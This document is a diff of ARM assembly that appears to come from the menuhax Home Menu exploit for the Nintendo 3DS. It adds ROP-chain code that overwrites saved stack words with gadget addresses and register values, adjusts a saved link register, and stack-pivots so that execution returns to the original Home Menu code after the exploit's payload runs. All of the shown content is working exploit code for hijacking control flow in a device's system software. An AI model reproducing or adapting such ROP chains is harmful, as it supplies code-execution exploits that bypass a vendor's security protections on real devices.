@@ -10,13 +10,32 @@ _start:
 
 ropstackstart:
 
+@ Increase the saved LR used with the ret2menu stack-pivot data by 0xc, so that it jumps to the pop-instruction instead.
+ROPMACRO_LDDRR0_ADDR1_STRADDR BOSSBANNERHAX_SPRETADDR+(5*4), BOSSBANNERHAX_SPRETADDR+(5*4), 0xc
+
+@ BOSSBANNERHAX_SPRETADDR-(9*4) is the start of the data for POP_R4FPPC during stack-pivot.
+ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(4*4), 0x0 @ r9 value
+ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(3*4), 0x0 @ sl value
+ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(2*4), 0x1 @ fp value
+ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(1*4), POP_R4R8PC
+
 #include "menuhax_loader.s"
 
 @ The ROP used for RET2MENU starts here.
 
+ROPMACRO_STACKPIVOT BOSSBANNERHAX_SPRETADDR-(9*4), POP_R4FPPC @ Return to executing the original homemenu code.
+
 menuhaxloader_beforethreadexit:
 
-.word MAINLR_SVCEXITPROCESS
+@ Copy the addr from menuhax_payload beforethreadexit_return_spaddr to the word which will be popped into sp.
+ROPMACRO_COPYWORD ROPBUFLOC(stackpivot_sploadword), MENUHAXLOADER_LOAD_BINADDR+12
+
+@ Write to the word which will be popped into pc.
+ROPMACRO_WRITEWORD ROPBUFLOC(stackpivot_pcloadword), ROP_POPPC
+
+ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
+
+ROPMACRO_STACKPIVOT_JUMP
 
 object:
 .word ROPBUFLOC(vtable) @ object+0, vtable ptr
